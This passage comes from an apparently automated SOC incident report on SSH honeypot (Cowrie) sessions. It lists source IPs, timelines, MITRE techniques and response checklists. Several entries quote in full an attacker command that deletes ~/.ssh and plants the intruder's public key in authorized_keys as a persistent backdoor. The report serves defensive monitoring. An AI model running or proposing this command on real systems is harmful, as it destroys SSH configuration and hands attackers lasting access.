| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:30:25` | `cowrie.session.connect` |
| `2026-04-16 03:30:25` | `cowrie.client.version` |
| `2026-04-16 03:30:25` | `cowrie.client.kex` |
| `2026-04-16 03:30:27` | `cowrie.login.success` |
| `2026-04-16 03:30:28` | `cowrie.session.params` |
| `2026-04-16 03:30:28` | `cowrie.command.input` |
| `2026-04-16 03:30:28` | `cowrie.command.failed` |
| `2026-04-16 03:30:28` | `cowrie.log.closed` |
| `2026-04-16 03:30:29` | `cowrie.session.params` |
| `2026-04-16 03:30:29` | `cowrie.command.input` |
| `2026-04-16 03:30:29` | `cowrie.session.file_download` |
| `2026-04-16 03:30:29` | `cowrie.log.closed` |
| `2026-04-16 03:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778227d31acd

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:30 |
| **Last Seen** | 2026-04-16 03:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:30:33` | `cowrie.session.connect` |
| `2026-04-16 03:30:33` | `cowrie.client.version` |
| `2026-04-16 03:30:34` | `cowrie.client.kex` |
| `2026-04-16 03:30:35` | `cowrie.login.success` |
| `2026-04-16 03:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc57e3e1988

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:36 |
| **Last Seen** | 2026-04-16 03:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:36:30` | `cowrie.session.connect` |
| `2026-04-16 03:36:30` | `cowrie.client.version` |
| `2026-04-16 03:36:31` | `cowrie.client.kex` |
| `2026-04-16 03:36:32` | `cowrie.login.success` |
| `2026-04-16 03:36:33` | `cowrie.session.params` |
| `2026-04-16 03:36:33` | `cowrie.command.input` |
| `2026-04-16 03:36:33` | `cowrie.command.failed` |
| `2026-04-16 03:36:34` | `cowrie.log.closed` |
| `2026-04-16 03:36:34` | `cowrie.session.params` |
| `2026-04-16 03:36:34` | `cowrie.command.input` |
| `2026-04-16 03:36:35` | `cowrie.session.file_download` |
| `2026-04-16 03:36:35` | `cowrie.log.closed` |
| `2026-04-16 03:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fc4dbad1591

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:36 |
| **Last Seen** | 2026-04-16 03:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:36:39` | `cowrie.session.connect` |
| `2026-04-16 03:36:39` | `cowrie.client.version` |
| `2026-04-16 03:36:39` | `cowrie.client.kex` |
| `2026-04-16 03:36:41` | `cowrie.login.success` |
| `2026-04-16 03:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0656e77f6de3

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:44 |
| **Last Seen** | 2026-04-16 03:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:44:12` | `cowrie.session.connect` |
| `2026-04-16 03:44:12` | `cowrie.client.version` |
| `2026-04-16 03:44:13` | `cowrie.client.kex` |
| `2026-04-16 03:44:14` | `cowrie.login.success` |
| `2026-04-16 03:44:15` | `cowrie.session.params` |
| `2026-04-16 03:44:15` | `cowrie.command.input` |
| `2026-04-16 03:44:15` | `cowrie.command.failed` |
| `2026-04-16 03:44:16` | `cowrie.log.closed` |
| `2026-04-16 03:44:16` | `cowrie.session.params` |
| `2026-04-16 03:44:16` | `cowrie.command.input` |
| `2026-04-16 03:44:17` | `cowrie.session.file_download` |
| `2026-04-16 03:44:17` | `cowrie.log.closed` |
| `2026-04-16 03:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70c4fe5d7f27

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:44 |
| **Last Seen** | 2026-04-16 03:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:44:21` | `cowrie.session.connect` |
| `2026-04-16 03:44:21` | `cowrie.client.version` |
| `2026-04-16 03:44:21` | `cowrie.client.kex` |
| `2026-04-16 03:44:23` | `cowrie.login.success` |
| `2026-04-16 03:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bde2dce3ce37

| Field | Detail |
|---|---|
| **Source IP** | `152.32.131[.]112` |
| **First Seen** | 2026-04-16 03:45 |
| **Last Seen** | 2026-04-16 03:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:45:02` | `cowrie.session.connect` |
| `2026-04-16 03:45:02` | `cowrie.client.version` |
| `2026-04-16 03:45:02` | `cowrie.client.kex` |
| `2026-04-16 03:45:02` | `cowrie.login.success` |
| `2026-04-16 03:45:02` | `cowrie.session.params` |
| `2026-04-16 03:45:02` | `cowrie.command.input` |
| `2026-04-16 03:45:02` | `cowrie.command.failed` |
| `2026-04-16 03:45:02` | `cowrie.log.closed` |
| `2026-04-16 03:45:03` | `cowrie.session.params` |
| `2026-04-16 03:45:03` | `cowrie.command.input` |
| `2026-04-16 03:45:03` | `cowrie.session.file_download` |
| `2026-04-16 03:45:03` | `cowrie.log.closed` |
| `2026-04-16 03:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.131[.]112` to AbuseIPDB if not already reported
- [ ] Block `152.32.131[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c3c029c164

| Field | Detail |
|---|---|
| **Source IP** | `152.32.131[.]112` |
| **First Seen** | 2026-04-16 03:45 |
| **Last Seen** | 2026-04-16 03:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:45:05` | `cowrie.session.connect` |
| `2026-04-16 03:45:05` | `cowrie.client.version` |
| `2026-04-16 03:45:05` | `cowrie.client.kex` |
| `2026-04-16 03:45:05` | `cowrie.login.success` |
| `2026-04-16 03:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.131[.]112` to AbuseIPDB if not already reported
- [ ] Block `152.32.131[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbe00e7da47e

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:46 |
| **Last Seen** | 2026-04-16 03:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:46:10` | `cowrie.session.connect` |
| `2026-04-16 03:46:10` | `cowrie.client.version` |
| `2026-04-16 03:46:11` | `cowrie.client.kex` |
| `2026-04-16 03:46:12` | `cowrie.login.success` |
| `2026-04-16 03:46:13` | `cowrie.session.params` |
| `2026-04-16 03:46:13` | `cowrie.command.input` |
| `2026-04-16 03:46:13` | `cowrie.command.failed` |
| `2026-04-16 03:46:14` | `cowrie.log.closed` |
| `2026-04-16 03:46:15` | `cowrie.session.params` |
| `2026-04-16 03:46:15` | `cowrie.command.input` |
| `2026-04-16 03:46:15` | `cowrie.session.file_download` |
| `2026-04-16 03:46:15` | `cowrie.log.closed` |
| `2026-04-16 03:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd3c9b5e9d35

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:46 |
| **Last Seen** | 2026-04-16 03:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:46:19` | `cowrie.session.connect` |
| `2026-04-16 03:46:19` | `cowrie.client.version` |
| `2026-04-16 03:46:19` | `cowrie.client.kex` |
| `2026-04-16 03:46:21` | `cowrie.login.success` |
| `2026-04-16 03:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddef4ffe3181

| Field | Detail |
|---|---|
| **Source IP** | `20.193.130[.]202` |
| **First Seen** | 2026-04-16 03:46 |
| **Last Seen** | 2026-04-16 03:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:46:53` | `cowrie.session.connect` |
| `2026-04-16 03:46:53` | `cowrie.client.version` |
| `2026-04-16 03:46:53` | `cowrie.client.kex` |
| `2026-04-16 03:46:53` | `cowrie.login.success` |
| `2026-04-16 03:46:53` | `cowrie.session.params` |
| `2026-04-16 03:46:53` | `cowrie.command.input` |
| `2026-04-16 03:46:53` | `cowrie.command.failed` |
| `2026-04-16 03:46:53` | `cowrie.log.closed` |
| `2026-04-16 03:46:53` | `cowrie.session.params` |
| `2026-04-16 03:46:53` | `cowrie.command.input` |
| `2026-04-16 03:46:53` | `cowrie.session.file_download` |
| `2026-04-16 03:46:53` | `cowrie.log.closed` |
| `2026-04-16 03:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.193.130[.]202` to AbuseIPDB if not already reported
- [ ] Block `20.193.130[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbf236446d6e

| Field | Detail |
|---|---|
| **Source IP** | `20.193.130[.]202` |
| **First Seen** | 2026-04-16 03:46 |
| **Last Seen** | 2026-04-16 03:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:46:54` | `cowrie.session.connect` |
| `2026-04-16 03:46:54` | `cowrie.client.version` |
| `2026-04-16 03:46:54` | `cowrie.client.kex` |
| `2026-04-16 03:46:54` | `cowrie.login.success` |
| `2026-04-16 03:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.193.130[.]202` to AbuseIPDB if not already reported
- [ ] Block `20.193.130[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ccc79a7fee3

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:48 |
| **Last Seen** | 2026-04-16 03:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:48:12` | `cowrie.session.connect` |
| `2026-04-16 03:48:12` | `cowrie.client.version` |
| `2026-04-16 03:48:12` | `cowrie.client.kex` |
| `2026-04-16 03:48:14` | `cowrie.login.success` |
| `2026-04-16 03:48:14` | `cowrie.session.params` |
| `2026-04-16 03:48:14` | `cowrie.command.input` |
| `2026-04-16 03:48:14` | `cowrie.command.failed` |
| `2026-04-16 03:48:15` | `cowrie.log.closed` |
| `2026-04-16 03:48:16` | `cowrie.session.params` |
| `2026-04-16 03:48:16` | `cowrie.command.input` |
| `2026-04-16 03:48:16` | `cowrie.session.file_download` |
| `2026-04-16 03:48:16` | `cowrie.log.closed` |
| `2026-04-16 03:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dfee8d3cce5

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:48 |
| **Last Seen** | 2026-04-16 03:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:48:20` | `cowrie.session.connect` |
| `2026-04-16 03:48:20` | `cowrie.client.version` |
| `2026-04-16 03:48:21` | `cowrie.client.kex` |
| `2026-04-16 03:48:22` | `cowrie.login.success` |
| `2026-04-16 03:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f22fcb23ae44

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:50 |
| **Last Seen** | 2026-04-16 03:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:50:21` | `cowrie.session.connect` |
| `2026-04-16 03:50:21` | `cowrie.client.version` |
| `2026-04-16 03:50:22` | `cowrie.client.kex` |
| `2026-04-16 03:50:23` | `cowrie.login.success` |
| `2026-04-16 03:50:24` | `cowrie.session.params` |
| `2026-04-16 03:50:24` | `cowrie.command.input` |
| `2026-04-16 03:50:24` | `cowrie.command.failed` |
| `2026-04-16 03:50:24` | `cowrie.log.closed` |
| `2026-04-16 03:50:25` | `cowrie.session.params` |
| `2026-04-16 03:50:25` | `cowrie.command.input` |
| `2026-04-16 03:50:26` | `cowrie.session.file_download` |
| `2026-04-16 03:50:26` | `cowrie.log.closed` |
| `2026-04-16 03:50:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8db0e9e13e22

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:50 |
| **Last Seen** | 2026-04-16 03:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:50:30` | `cowrie.session.connect` |
| `2026-04-16 03:50:30` | `cowrie.client.version` |
| `2026-04-16 03:50:30` | `cowrie.client.kex` |
| `2026-04-16 03:50:32` | `cowrie.login.success` |
| `2026-04-16 03:50:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0883cc8d0abe

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:52 |
| **Last Seen** | 2026-04-16 03:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:52:25` | `cowrie.session.connect` |
| `2026-04-16 03:52:25` | `cowrie.client.version` |
| `2026-04-16 03:52:26` | `cowrie.client.kex` |
| `2026-04-16 03:52:27` | `cowrie.login.success` |
| `2026-04-16 03:52:28` | `cowrie.session.params` |
| `2026-04-16 03:52:28` | `cowrie.command.input` |
